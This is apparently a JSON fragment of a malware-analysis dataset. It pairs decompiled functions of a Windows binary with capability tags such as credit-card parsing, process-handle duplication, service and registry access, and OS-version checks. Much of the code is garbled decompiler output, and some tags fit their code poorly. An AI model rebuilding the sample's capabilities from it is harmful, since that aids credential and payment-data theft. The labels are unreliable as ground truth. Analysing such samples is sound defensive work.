        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040284c)\n\nuint __cdecl fcn.004027f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    var_8h = (**0x425728)();\n    if (var_8h == -1) {\n        return 0xffffffff;\n    }\n    puVar3 = &var_12ch;\n    for (iVar1 = 0x49; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar1 = (**0x42572c)();\n    do {\n        puVar2 = &stack0xfffffffc;\n        if (iVar1 == 0) {\ncode_r0x004028cb:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            return *(puVar2 + -4);\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (iVar1 == 0) {\n            puVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n            *(puVar2 + -4) = *(puVar2 + -0x128);\n            goto code_r0x004028cb;\n        }\n        iVar1 = (**0x425730)();\n    } while( true );\n}\n",
        "token_count": 371
    },
    "004029b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00402a13)\n// WARNING: Removing unreachable block (ram,0x00402a20)\n\nuint __cdecl fcn.004029b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004027f0(0x40707c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    if ((!SBORROW4(iVar1, -1)) && (SBORROW4(iVar1, -1))) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 302
    },
    "00402a60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b3e) overlaps instruction at (ram,0x00402b3a)\n// \n\nuint __cdecl fcn.00402a60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint8_t in_AL;\n    uint uVar2;\n    int32_t arg_8h_00;\n    int32_t *piVar3;\n    uint unaff_EBX;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 Var7;\n    ulong uVar8;\n    uint uStack20;\n    uint var_4h;\n    \n    puVar4 = &stack0xfffffffc;\n    bVar6 = (POPCOUNT(((in_AL & unaff_EBX >> 8) - 0x3488 & 0x7ee5) * 2 & 0xff) & 1U) == 0;\n    uStack20 = 0x402a88;\n    *0x42573c = fcn.00401b80();\n    if ((!bVar6) && (bVar6)) {\n        puVar5 = &stack0xffffffec;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    uStack20 = 0;\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    uVar8 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &fcn.00402a60::var_4h, 0);\n    piVar3 = uVar8 >> 0x20;\n    if (uVar8 == 0) {\n        return 0;\n    }\n    bVar6 = false;\n    Var7 = extraout_ST0;\n    if (*0x42573c != 0) {\n        uVar8 = fcn.004029b0(arg_8h_00);\n        piVar3 = uVar8 >> 0x20;\n        *0x42573c = -(uVar8 != 0);\n        bVar6 = SCARRY4(*0x42573c, 1);\n        *0x42573c = *0x42573c + 1;\n        Var7 = extraout_ST0_00;\n    }\n    if ((bVar6 == *0x42573c < 0) && (bVar6 != *0x42573c < 0)) {\n        *(*0x42573c + -0x7ce92414) = Var7;\n        *piVar3 = *piVar3 + 0x6a56df84;\n    }\n    else {\n        fcn.00401000(0, arg_8h_00);\n    }\n    if (*0x42573c == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 798
    },
    "00402e00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402f85) overlaps instruction at (ram,0x00402f84)\n// \n// WARNING: Removing unreachable block (ram,0x00402f28)\n// WARNING: Removing unreachable block (ram,0x00402f30)\n// WARNING: Removing unreachable block (ram,0x00402ea9)\n// WARNING: Removing unreachable block (ram,0x00402f75)\n// WARNING: Removing unreachable block (ram,0x00402f7a)\n// WARNING: Removing unreachable block (ram,0x00402ff0)\n\nint32_t __fastcall fcn.00402e00(uint32_t param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint8_t *puVar1;\n    uint arg_8h;\n    uint *puVar2;\n    uint8_t in_AL;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint16_t extraout_CX;\n    int32_t *piVar7;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar8;\n    uint16_t in_SS;\n    uint8_t uVar9;\n    uint8_t in_AF;\n    char cVar10;\n    char cVar11;\n    unkbyte10 extraout_ST0;\n    ulong uVar12;\n    int32_t in_stack_00000014;\n    uint in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint32_t in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    \n    if ((*0x10 == 0x110) || (uVar4 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff,  *0x10 != 0x110)) {\n        in_AL = in_stack_0000001c + 0x20;\n        in_stack_fffffedc = 0x20;\n        uVar4 = param_3;\n        unaff_EBX = in_stack_00000014;\n        unaff_ESI = in_stack_0000001c;\n        in_stack_fffffed4 = in_stack_00000018;\n        in_stack_fffffed8 = param_3;\n    }\n    *(unaff_EBX + 0x7d8b084d) = *(unaff_EBX + 0x7d8b084d) & uVar4;\n    *0x6a50208d = (*0x6a50208d - uVar4) - (in_AL < 0x8b);\n    puVar1 = uVar4 + 0x57;\n    uVar9 = 0;\n    cVar11 = '\\0';\n    *puVar1 = *puVar1 & param_2;\n    cVar10 = *puVar1 < '\\0';\n    uVar12 = fcn.004031e0(unaff_EBX, in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc);\n    piVar7 = uVar12 >> 0x20;\n    uVar4 = *0x53;\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        *(uVar12 + -0x7ce92414) = extraout_ST0;\n        uVar4 = uVar12 - 1;\n        uVar3 = uVar4;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        uVar3 = uVar3 + in_AF * '\\x06';\n        *piVar7 = *piVar7 + 0x458bdf84;\n        uVar4 = uVar4 & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | uVar9 | in_AF * (0xf9 < uVar3)) * '`' | 0x8d;\n    }\n    fcn.004031e0(unaff_EBX, in_stack_fffffed0 & 0xffff0000 | in_SS, uVar4, 0x20);\n    puVar2 = *0x63;\n    arg_8h = *0x5f;\n    cVar11 = '\\0';\n    cVar10 = (unaff_EBX ^ extraout_CX) < 0;\n    uVar5 = fcn.004031e0(*0x5f, *0x63, *0x57, 0x20);\n    puVar8 = puVar2;\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        out(0xc4, uVar5);\n        puVar8 = puVar2 + 1;\n        *puVar2 = uVar5;\n    }\n    fcn.004031e0(arg_8h, puVar8, *0x5b, 0x20);\n    iVar6 = fcn.00402db0();\n    if (iVar6 == -1) {\n        iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(unaff_ESI + 0x120) = iVar6 % 5;\n    }\n    else {\n        *(unaff_ESI + 0x120) = iVar6;\n    }\n    *0xffffff3b = 0;\n    puVar8 = 0xffffff3c;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *0x43 = 0x104;\n    *(puVar8 + 2) = 0;\n    iVar6 = fcn.00404ec0(0x80000001, 0x407258, 0x407284, 0x3f, 0xffffff3b, 0x43);\n    // WARNING: Bad instruction - Truncating control flow here\n    if ((iVar6 != 0) && (iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)(0xff3b, 0xd4),  iVar6 == 0)) {\n        *(unaff_ESI + 0x120) = *(unaff_ESI + 0x120) | 0x80;\n    }\n    return iVar6;\n}\n",
        "token_count": 1461
    },
    "00402fc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402fc0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403700(0x407010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00403830": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403924) overlaps instruction at (ram,0x00403923)\n// \n// WARNING: Removing unreachable block (ram,0x004039f7)\n// WARNING: Removing unreachable block (ram,0x00403a04)\n// WARNING: Removing unreachable block (ram,0x004039b5)\n// WARNING: Removing unreachable block (ram,0x00403912)\n// WARNING: Removing unreachable block (ram,0x00403914)\n// WARNING: Removing unreachable block (ram,0x00403984)\n// WARNING: Removing unreachable block (ram,0x00403986)\n// WARNING: Removing unreachable block (ram,0x00403924)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00403830(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uchar *unaff_EDI;\n    uint *puVar3;\n    bool bVar4;\n    unkbyte6 Var5;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    Var5 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return true;\n    }\n    if ((SBORROW4(var_90h, 5)) || (!SBORROW4(var_90h, 5))) {\n        if ((var_90h == 6) && (var_8ch == 0)) {\n            return true;\n        }\n        return false;\n    }\n    uVar1 = in(Var5 >> 0x20);\n    *unaff_EDI = uVar1;\n    if (var_90h < 6) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (var_90h < 5) {\n        out(0xc4, Var5);\n        *(unaff_EDI + 1) = Var5;\n    }\n    iVar2 = fcn.004027f0(0x407074);\n    // WARNING: Bad instruction - Truncating control flow here\n    if (iVar2 == -1) {\n        fcn.00404020();\n        *0x425740 = 1;\n        iVar2 = fcn.00402fc0();\n        bVar4 = iVar2 != 0;\n        if (bVar4) {\n            return false;\n        }\n        if ((bVar4) && (!bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar3 = &var_1fh;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar3 = &var_80h + 1;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar3 = &var_60h + 1;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        puVar3 = &var_40h + 1;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        iVar2 = fcn.004046b0(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar2 != 0) {\n            iVar2 = fcn.00403310(&var_20h);\n            if (iVar2 != 0) {\n                iVar2 = fcn.00401350(&var_80h, &var_60h, &var_20h, &var_40h);\n                return iVar2 != 0;\n            }\n            return false;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 1126
    },
    "00401ac0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401ac0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        do {\n            arg_8h = arg_8h + *arg_ch;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 195
    },
    "00403000": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403062) overlaps instruction at (ram,0x0040305d)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00403000(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, int32_t param_6)\n\n{\n    int32_t *piVar1;\n    float10 fVar2;\n    float10 fVar3;\n    float10 fVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    uint16_t uVar8;\n    uint *puVar9;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t extraout_ECX;\n    uint uVar14;\n    uchar *unaff_ESI;\n    uint *puVar15;\n    int32_t unaff_EDI;\n    uint *puVar16;\n    bool bVar17;\n    bool bVar18;\n    float10 in_ST0;\n    float10 extraout_ST0;\n    float10 fVar19;\n    float10 fVar20;\n    float10 extraout_ST0_00;\n    float10 extraout_ST1;\n    float10 fVar21;\n    float10 extraout_ST1_00;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    ulong uVar22;\n    uchar uStack36;\n    uint uStack35;\n    char *pcVar10;\n    \n    if ((-1 < &stack0xffffffdc) && (-1 >= &stack0xffffffdc)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n        unaff_ESI = unaff_ESI + 5;\n        in_ST2 = in_ST3;\n        in_ST3 = in_ST4;\n        in_ST4 = in_ST5;\n        in_ST5 = in_ST6;\n        in_ST6 = in_ST7;\n    }\n    uVar22 = fcn.00402d20(param_5, param_6, 0x407054, 7);\n    uVar14 = uVar22 >> 0x20;\n    puVar9 = uVar22;\n    bVar17 = puVar9 == NULL;\n    if (bVar17) {\n        return 0;\n    }\n    fVar20 = extraout_ST0;\n    fVar2 = extraout_ST1;\n    fVar3 = in_ST2;\n    fVar4 = in_ST3;\n    fVar5 = in_ST4;\n    fVar6 = in_ST5;\n    fVar7 = in_ST6;\n    if (bVar17) goto code_r0x00403075;\n    fVar19 = extraout_ST0;\n    fVar20 = extraout_ST0;\n    fVar21 = extraout_ST1;\n    fVar2 = extraout_ST1;\n    if (!bVar17) goto code_r0x00403075;\n    do {\n        out(*unaff_ESI, uVar14);\n        fVar20 = fVar19;\n        fVar2 = fVar21;\n        fVar3 = in_ST2;\n        fVar4 = in_ST3;\n        fVar5 = in_ST4;\n        fVar6 = in_ST5;\n        fVar7 = in_ST6;\ncode_r0x00403075:\n        in_ST6 = in_ST7;\n        in_ST5 = fVar7;\n        in_ST4 = fVar6;\n        in_ST3 = fVar5;\n        in_ST2 = fVar4;\n        fVar21 = fVar3;\n        fVar19 = fVar2;\n        piVar1 = _sym.imp.MSVCRT.dll_rand;\n        puVar11 = NULL;\n        uStack36 = 0;\n        puVar15 = &stack0xffffffdd;\n        for (iVar13 = 7; iVar13 != 0; iVar13 = iVar13 + -1) {\n            *puVar15 = 0;\n            puVar15 = puVar15 + 1;\n        }\n        *puVar15 = 0;\n        *(puVar15 + 2) = 0;\n        bVar17 = false;\n        unaff_ESI = NULL;\n        while ((bVar17 || (!bVar17))) {\n            uVar22 = (*piVar1)();\n            uVar14 = uVar22 >> 0x20;\n            puVar11 = uVar22 & 0x800000ff;\n            if (puVar11 < 0) {\n                puVar11 = (puVar11 - 1U | 0xffffff00) + 1;\n            }\n            (&stack0xffffffdc)[unaff_ESI] = puVar11;\n            unaff_ESI = unaff_ESI + 1;\n            bVar17 = unaff_ESI < 0x20;\n            fVar20 = extraout_ST0_00;\n            fVar19 = extraout_ST1_00;\n            if (!bVar17) {\n                puVar15 = &stack0xffffffdc;\n                puVar16 = puVar9;\n                for (iVar13 = 8; iVar13 != 0; iVar13 = iVar13 + -1) {\n                    *puVar16 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar16 = puVar16 + 1;\n                }\n                bVar17 = false;\n                bVar18 = (uVar22 >> 0x20 | 0x1f) == 0;\n                uVar22 = fcn.00402e00(param_1, param_2, param_3, param_4, &stack0xffffffdc, 0x20, puVar9);\n                puVar9 = uVar22;\n                if ((bVar17 || bVar18) || (iVar13 = extraout_ECX,  uVar14 = uVar22 >> 0x20,  !bVar17 && !bVar18)) {\n                    iVar13 = param_6;\n                    uVar14 = param_5;\n                }\n                *puVar16 = *puVar15;\n                puVar9[-1] = 0x8be181cf;\n                *(iVar13 + 0x52) = *(iVar13 + 0x52) - uVar14;\n                puVar9[-2] = 0x403151;\n                fcn.00403650(puVar9[-1], *puVar9);\n                return 1;\n            }\n        }\n        uVar12 = puVar11 + 1;\n        if (&stack0xffffffd4 < *puVar11 || uVar12 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        unaff_ESI[-0x75] = unaff_ESI[-0x75] + (uVar12 >> 8);\n        uVar8 = uVar12 * unaff_ESI[-0x79];\n        pcVar10 = uVar12 & 0xffff0000 | uVar8;\n        *piVar1 = fVar20 / *(unaff_ESI + 0x6f);\n        *pcVar10 = *pcVar10 + uVar8;\n        pcVar10[0x4bb148d3] = pcVar10[0x4bb148d3] + (uVar8 >> 8);\n        in_ST7 = in_ST6;\n    } while( true );\n}\n",
        "token_count": 1666
    },
    "004036d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nint32_t fcn.004036d0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00404a80": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404a80(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00401620(arg_8h_00, arg_8h);\n    uVar1 = fcn.00404f70(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "00404ec0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404ec0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 186
    },
    "00401c10": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d0f) overlaps instruction at (ram,0x00401d0d)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint * fcn.00401c10(uint32_t param_1, uint32_t param_2, ulong param_3)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    char cVar7;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint16_t uVar10;\n    uint *puVar12;\n    uint *puVar13;\n    uchar uVar14;\n    uint8_t in_AF;\n    uchar uVar15;\n    uint8_t in_IF;\n    bool bVar16;\n    uchar uVar17;\n    bool bVar18;\n    uint64_t uVar19;\n    uint32_t uVar11;\n    \n    bVar16 = false;\n    uVar19 = fcn.00401ac0(0, param_1, param_2 + 1 >> 1);\n    uVar4 = uVar19;\n    uVar14 = 0;\n    uVar17 = 0;\n    uVar15 = (uVar19 & 0xffff) == 0;\n    if ((uVar15) || (uVar8 = (extraout_ECX >> 8 & 0xffff00) << 8 | extraout_ECX & 0xffff,  !uVar15)) {\n        uVar19 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n        uVar8 = extraout_ECX_00;\n    }\n    else {\n        param_1 = 0x47;\n        uVar14 = 0xffbf9e87 < uVar4;\n        pcVar2 = sym.imp.dbghelp.dll_ImageNtHeader + uVar4;\n        uVar19 = uVar19 & 0xffffffff00000000 | ZEXT48(pcVar2);\n        uVar17 = SCARRY4(uVar4, 0x406178) != SCARRY4(pcVar2, 0);\n        uVar15 = pcVar2 == NULL;\n    }\n    pcVar9 = uVar19 >> 0x20;\n    puVar5 = uVar19;\n    if ((uVar17) || (!uVar17)) {\n        uVar8 = puVar5[0x16];\n    }\n    else {\n        uVar14 = false;\n        uVar15 = (uVar8 & *(uVar8 + 0x87cb1757)) == 0;\n        uVar8 = 0x4f8b5d21;\n    }\n    uVar11 = uVar4 & 0xffff;\n    if ((!uVar14 && !uVar15) && (uVar14 || uVar15)) {\n        uVar11 = param_1;\n    }\n    uVar3 = uVar8;\n    uVar10 = uVar11;\n    if (uVar10 < uVar3) {\n        if ((uVar10 != uVar3) && (uVar10 == uVar3)) {\n            bVar16 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n            in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n        }\n        puVar12 = (uVar11 - uVar8 & 0xffff) - 1;\n    }\n    else {\n        pcVar9 = uVar8 & 0xffff;\n        puVar12 = uVar11 - pcVar9;\n    }\n    puVar6 = uVar8 >> 0x10;\n    uVar3 = uVar8 >> 0x10;\n    bVar18 = SBORROW2(puVar12, uVar3);\n    if (puVar12 < uVar3) {\n        if ((!bVar18) && (bVar18)) {\n            *puVar5 = *puVar12;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar12 = (puVar12 - puVar6 & 0xffffU) - 1;\n    }\n    else {\n        puVar12 = puVar12 - puVar6;\n    }\n    bVar18 = (POPCOUNT(puVar12 & 0xff) & 1U) == 0;\n    if ((bVar18) || (!bVar18)) {\n        puVar6 = param_3 >> 0x20;\n        in_AF = CARRY4(puVar12, param_2);\n        puVar13 = puVar12 + param_2;\n        *puVar6 = puVar13;\n    }\n    else {\n        puVar13 = puVar12 + bVar16 * -2 + 1;\n        out(*puVar12, pcVar9);\n        do {\n            cVar7 = puVar6 >> 8;\n            in_AF = 9 < (puVar6 & 0xf) | in_AF;\n            puVar6 = CONCAT11(cVar7 - in_AF, -in_AF);\n        } while (in_AF || cVar7 == *pcVar9);\n    }\n    puVar1 = puVar5 + pcVar9 * 2;\n    uVar4 = *puVar1;\n    uVar11 = *puVar1;\n    *puVar1 = (uVar11 + 0x7b) - in_AF;\n    *(uVar8 - 0x75) = puVar6;\n    *(puVar6 & 0xffffff00 | puVar6 + '\\x03' + (uVar4 < 0xffffff85 || uVar11 + 0x7b < in_AF)) = puVar13;\n    *param_3._1_4_ = puVar5[0x16];\n    return puVar5;\n}\n",
        "token_count": 1325
    },
    "00401d80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool fcn.00401d80(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint var_4h;\n    \n    pvData = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, &pdwType, &pvData, &var_4h);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 323
    },
    "00401e80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401e80(uint s1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    uVar3 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    *(uVar3 - 0x14) = 0x407440;\n    *(uVar3 - 0x10) = 0x407438;\n    *(uVar3 - 0xc) = 0x407448;\n    *(uVar3 - 8) = 0x407450;\n    *(uVar3 - 4) = 0x407458;\n    uVar4 = 0;\n    do {\n        uVar1 = *(uVar3 + 8);\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(uVar1);\n        if (iVar2 != 0) {\n            return true;\n        }\n        uVar5 = uVar4 + 1;\n        iVar2 = uVar4 - 4;\n        uVar4 = uVar5;\n    } while (uVar5 < 5);\n    if ((4 < uVar5) && (SBORROW4(uVar5, 5) != iVar2 < 0)) {\n        *(uVar5 | uVar3) = 0;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(uVar1);\n    return iVar2 == 0;\n}\n",
        "token_count": 390
    },
    "00402b90": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402b90(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = 